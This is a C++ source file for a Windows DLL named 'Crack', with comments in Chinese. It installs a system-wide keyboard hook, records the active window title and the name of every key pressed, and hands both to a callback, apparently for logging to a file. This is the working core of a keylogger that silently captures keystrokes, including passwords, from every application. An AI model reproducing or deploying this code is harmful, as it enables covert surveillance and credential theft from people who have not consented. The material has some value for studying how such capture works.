// Crack.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

// 钩子
__declspec(selectany) HHOOK g_hHook = NULL;

// 回调
__declspec(selectany) Callback g_Callback = NULL;

// 自定义调用参数
__declspec(selectany) void* g_User = NULL;

//安装钩子
BOOL InstallHook(Callback cb, void *user) {
	//安装钩子
	g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, GetModuleHandle(L"Crack"), 0);

	if (g_hHook == NULL)
		return false;

	g_Callback = cb;
	g_User = user;

	return true;
}

//卸载钩子
BOOL UninstallHook() {
	return UnhookWindowsHookEx(g_hHook);
}

/* 钩子处理函数
* 回调函数 KeyboardProc 会接收到三个参数：
nCode：钩子事件的代码，告诉你该事件是否有效。
wParam：表示键盘消息的类型（如 WM_KEYDOWN、WM_KEYUP），帮助你判断事件的状态。
lParam：键盘事件的附加信息，通常是一个 DWORD 值，其中包含按键的扫描码、重复次数等信息。
*/
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	// 值 < 0：表示钩子函数不应处理此消息，系统将继续传递该消息
	// HC_NOREMOVE：表示消息队列中没有移除消息，因此不需要处理该消息
	if (nCode < 0 || nCode == HC_NOREMOVE) {
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	}

	//文件打开失败
	if (g_User == NULL || g_Callback == NULL) {
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	}

	HWND hWnd = GetActiveWindow();
	if (hWnd == NULL) {
		hWnd = GetForegroundWindow();
	}

	if (hWnd == NULL) {
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	}

	// 用来检查是否按下了上下文键（例如 ALT 键）
	if (lParam & 0x40000000) {
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	}

	//获取窗口标题
	char szTitleText[MAX_PATH];
	GetWindowTextA(hWnd, szTitleText, MAX_PATH);
	//获取按键名称
	char szKey[100];
	GetKeyNameTextA(lParam, szKey, 100);

	g_Callback(szTitleText, szKey, g_User);

	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}
